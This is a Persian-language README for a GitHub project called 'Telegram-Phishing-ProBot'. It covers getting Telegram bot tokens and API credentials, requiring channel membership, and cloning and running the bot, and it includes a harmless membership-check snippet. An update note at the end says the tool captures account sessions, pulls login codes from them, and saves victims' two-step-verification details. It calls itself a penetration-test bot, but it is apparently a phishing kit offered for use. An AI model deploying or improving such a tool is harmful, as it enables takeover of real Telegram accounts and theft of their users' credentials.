# 📌 **آموزش تنظیم و راه‌اندازی ربات تلگرام**

channel -: https://t.me/Scripted_Seer
---

![image](https://github.com/user-attachments/assets/56d32a6d-a856-4d8d-b5ef-4d39afd8f9bb)


---


---
## 1️⃣ **دریافت API Token از بات‌فادر**
برای راه‌اندازی ربات، شما نیاز به **توکن API** از ربات بات‌فادر (**BotFather**) دارید:

1. وارد تلگرام شوید و به ربات [BotFather](https://t.me/BotFather) پیام دهید.
2. دستور /start را ارسال کنید.
3. دستور /newbot را برای ساخت ربات جدید وارد کنید.
4. بات‌فادر از شما نام ربات و **یوزرنیم** (پایان‌یافته با bot) می‌خواهد.
5. پس از ثبت، بات‌فادر یک **API Token** ارائه می‌کند. آن را ذخیره کنید.

---

## 2️⃣ **دریافت API ID و API HASH**
برای اتصال به سرورهای تلگرام، نیاز به API ID و API Hash دارید. این مقادیر را از سایت [my.telegram.org](https://my.telegram.org) دریافت کنید:

1. وارد اکانت تلگرام خود در سایت فوق شوید.
2. به بخش **API Development Tools** بروید.
3. یک برنامه جدید ایجاد کنید:
   - **نام برنامه** را مشخص کنید (هر نامی که مدنظر دارید).
   - یک توضیح کوتاه اضافه کنید.
   - دسته‌بندی مربوطه را انتخاب کنید.
4. پس از ذخیره، **API ID** و **API Hash** برای شما نمایش داده می‌شود.

---

## 3️⃣ **تعیین ID کانال**
- برای بررسی عضویت کاربر در یک کانال خاص، باید شناسه یا نام کاربری کانال را وارد کنید.
- اگر کانال دارای نام کاربری است، از فرمت زیر استفاده کنید:
  
  

@channel_username



- اگر کانال نام کاربری ندارد (Private)، ابتدا لینک دعوت بسازید و با ابزارهای آنلاین یا کد، **Chat ID** کانال را پیدا کنید.

---

## 📚 **نکات مهم درباره کانال**
1. ربات باید **ادمین کانال** شما باشد، در غیر این صورت نمی‌تواند عضویت کاربران را بررسی کند.
2. حداقل دسترسی‌های زیر برای ربات ادمین لازم است:
   - مشاهده اعضا.
   - افزودن اعضای جدید.

---

## 🔧 **ورودی های الزامی :**

هنگامی که ربات را اجرا میکنید موارد زیر را تنظیم کنید:


# API اطلاعات ضروری
API_ID 
API_HASH 
# توکن ربات تلگرام
BOT_TOKEN 

# آیدی کانال
CHANNEL_USERNAME



---

## 🎯 **ویژگی بررسی عضویت کاربر در کانال**

1. کاربر زمانی که دستور /start ارسال می‌کند، ربات عضویت وی را در کانال بررسی می‌کند.
2. اگر کاربر عضو کانال نبود:
   - پیام هشدار ارسال می‌شود:  
     
     **"❌ شما باید ابتدا عضو کانال ما شوید."**
   - لینک دعوت به کانال برای کاربر ارسال می‌شود.
3. اگر کاربر عضو کانال بود، دسترسی به سایر بخش‌های ربات آزاد خواهد شد.

کد مربوطه:

```
from telethon.sync import TelegramClient
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.errors.rpcerrorlist import UserNotParticipantError

async def check_membership(user_id, channel_username):
    try:
        result = await client(GetParticipantRequest(channel_username, user_id))
        return True  # کاربر عضو است
    except UserNotParticipantError:
        return False  # کاربر عضو نیست
```


---

## 💾 **پیش‌نیازهای پروژه**

ابتدا فایل پروژه را دانلود کنید :
```
git clone https://github.com/inits5/Telegram-Phishing-ProBot
```
و سپس
```
cd Telegram-Phishing-ProBot
```
برای اجرای این پروژه، مطمئن شوید کتابخانه‌های زیر نصب شده‌اند:
```
telethon
telebot
termcolor
logging
pyfiglet
asyncio
```



برای نصب، از دستور زیر استفاده کنید:

```
pip install -r requirements.txt
```



فایل requirements.txt شامل پیش‌نیازها است:
```
telethon
telebot
termcolor
logging
pyfiglet
asyncio
```
---
## **سپس فایل را اجرا کنید و ورودی های لازم را بدهید سپس از ربات استاده کنید :**
```
python main-fa.py
```
---

## 🚩 **موارد امنیتی**

1. توکن‌ها و مقادیر حساس را هیچ‌گاه مستقیماً به اشتراک نگذارید.
2. برای افزایش امنیت، می‌توانید از متغیرهای محیطی (Environment Variables) برای ذخیره اطلاعات مهم استفاده کنید.

---

**همین حالا کانفیگ ربات خود را کامل کنید و از ساخت یک ربات تست نفود لذت ببرید!** 🚀

## در اپدیت جدید :
از سشن به صورت عادی استفاده میکنیم همچنین یک اسکریپت برای دریافت کد ورود از سشن اکانت در پوشه sessions نوشته شده همچنین وقتی کاربر تایید دو مرحله داشته باشه اطلاعاتش داخل info ذخیره میشه
